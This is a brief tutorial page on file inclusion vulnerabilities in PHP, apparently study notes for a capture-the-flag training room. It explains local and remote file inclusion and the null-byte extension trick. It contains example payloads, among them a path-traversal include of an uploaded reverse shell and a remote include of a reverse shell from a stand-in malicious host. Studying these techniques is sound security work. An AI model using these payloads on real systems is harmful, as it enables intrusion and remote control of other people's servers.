# File inclusion

[![fileinc](../../../../_badges/thmp/fileinc.svg)](https://tryhackme.com/room/fileinc)

<div class="row row-cols-md-2"><div>

Files inclusion refers to websites that are importing or executing a file using the user input. 

* ğŸ¥¡ An include in PHP using the user input
* ğŸ A download URL using the user input
* ...

If the input is not filtered, a hacker may access/inject/download arbitrary content using [Path traversal](traversal.md).
</div><div>

**Example** ğŸ”¥: if there is a vulnerable backup plugin allowing us to download sensitive file, this is a file inclusion vulnerability.

There are two categories of file inclusion

* **Local File Inclusion (LFI)** ğŸ : include a local file
* **Remote File Inclusion (RFI)** âœˆï¸: include a remote file
</div></div>

<hr class="sep-both">

## PHP include file inclusion

<div class="row row-cols-md-2"><div>

The website `http://vulnerable.site/?lang=FR` is doing an include using `$_GET["lang"]` as seen below.

```php!
include "lang/$_GET[lang].php"
```

The import is not filtered, we can use [Path traversal](traversal.md) to include a malicious file, such as one we uploaded using another attack.

**Local File Inclusion (LFI)** ğŸ : inject a local file

```php
// ex: we uploaded a reverse shell (a fake PNG)
// as our avatar (avatar.png), then we could use:
include "lang/../uploads/avatar.png"
```
</div><div>

**Remote File Inclusion (RFI)** âœˆï¸: inject a remote file

```php
// ğŸ›‘ allow_url_fopen MUST BE SET TO true
include "http://malicious.site/reverse_shell.php"
```

**Additional notes**:

* The **null byte `%00`** could be used in **PHP < 5.3.4** to ignore trailing extensions such as `.php` below:

```php
include "xxx.cgi%00.php" // include xxx.cgi
```
</div></div>